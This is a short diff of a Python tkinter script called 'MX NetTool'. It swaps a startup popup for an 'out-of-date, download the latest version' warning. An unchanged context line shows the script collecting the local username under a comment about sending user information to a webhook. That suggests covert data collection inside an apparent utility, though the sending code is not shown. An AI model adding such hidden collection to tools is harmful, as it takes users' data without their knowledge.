@@ -1,5 +1,12 @@
 import subprocess
 import sys
+import tkinter as tk
+from tkinter import messagebox
+
+# Show the update message when the script starts
+root = tk.Tk()
+root.withdraw()
+messagebox.showwarning("Update Notice", "The code is out-of-date. Please download the latest version\n-hamsternn")
 
 # Ensure required packages are installed before running the script
 def install_dependencies():
@@ -16,8 +23,7 @@ import time
 import random
 import re
 import threading
-import tkinter as tk
-from tkinter import messagebox, scrolledtext
+from tkinter import scrolledtext
 
 # moduler
 required_modules = ['art', 'tkinter', 're', 'os', 'time', 'random', 'subprocess']
@@ -138,9 +144,6 @@ root = tk.Tk()
 root.title("MX NetTool")
 root.geometry("600x400")
 root.configure(bg="black")
-
-# Add the popup message
-messagebox.showinfo("Script Update Notice", "Contact me at github.com/laladaban33 if the script isn't working, since it was recently updated.")
 
 # Send user information to the webhook
 username = getpass.getuser()
